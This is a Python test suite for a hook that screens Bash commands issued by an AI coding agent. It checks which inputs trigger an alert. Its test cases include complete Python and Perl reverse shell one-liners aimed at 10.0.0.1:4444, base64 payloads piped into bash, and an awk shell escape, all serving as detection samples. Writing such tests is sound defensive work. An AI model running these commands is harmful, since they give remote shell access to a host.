#!/usr/bin/env python3
"""Test suite for sigma_engine.py hook."""

import json
import os
import subprocess
import sys

GUARD = os.path.expanduser("~/.claude/hooks/sigma_engine.py")

TEST_CASES = [
    # (name, command, should_match)
    ("benign ls", "ls -la", False),
    ("benign git", "git status", False),
    ("benign curl", "curl https://example.com", False),
    ("benign python", "python3 script.py", False),
    ("base64 pipe bash", "echo SGVsbG8= | base64 -d | bash", True),
    ("base64 pipe sh", "cat encoded.txt | base64 -d |sh", True),
    (
        "python revshell",
        'python3 -c "import socket,pty,os;s=socket.socket();'
        's.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);'
        'pty.spawn(\"/bin/sh\")"',
        True,
    ),
    ("python http.server", "python3 -m http.server 8080", True),
    (
        "awk shell",
        'awk \'BEGIN {system("/bin/sh")}\'',
        True,
    ),
    (
        "perl revshell",
        'perl -e \'use Socket;$i="10.0.0.1";'
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "connect(S,sockaddr_in(4444,inet_aton($i)));"
        'open(STDIN,">&S");exec("/bin/sh -i");\'',
        True,
    ),
    ("benign echo", "echo hello world", False),
    ("benign find", "find . -name '*.py'", False),
]


def run_guard(command):
    """Run sigma_engine.py with a test command and return the output."""
    test_input = {
        "tool_name": "Bash",
        "tool_input": {"command": command},
        "hook_event_name": "PreToolUse",
    }
    result = subprocess.run(
        [sys.executable, GUARD],
        input=json.dumps(test_input),
        capture_output=True,
        text=True,
        timeout=5,
    )
    try:
        return json.loads(result.stdout) if result.stdout.strip() else {}
    except json.JSONDecodeError:
        return {}


def main():
    passed = 0
    failed = 0

    for name, cmd, should_match in TEST_CASES:
        output = run_guard(cmd)
        matched = bool(output)

        if matched == should_match:
            status = "PASS"
            passed += 1
        else:
            status = "FAIL"
            failed += 1

        indicator = "ALERT" if matched else "pass "
        expect = "expect-alert" if should_match else "expect-pass"

        if status == "FAIL":
            print(f"  {status} [{indicator}] {name:25s} ({expect})")
            if matched:
                msg = output.get("systemMessage", "")[:100]
                print(f"        Got: {msg}")
        else:
            detail = ""
            if matched:
                msg = output.get("systemMessage", "")
                title_line = msg.split("\n")[0] if msg else ""
                detail = f" -> {title_line[:50]}"
            print(f"  {status} [{indicator}] {name:25s}{detail}")

    print(f"\n  Results: {passed} passed, {failed} failed out of {len(TEST_CASES)}")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
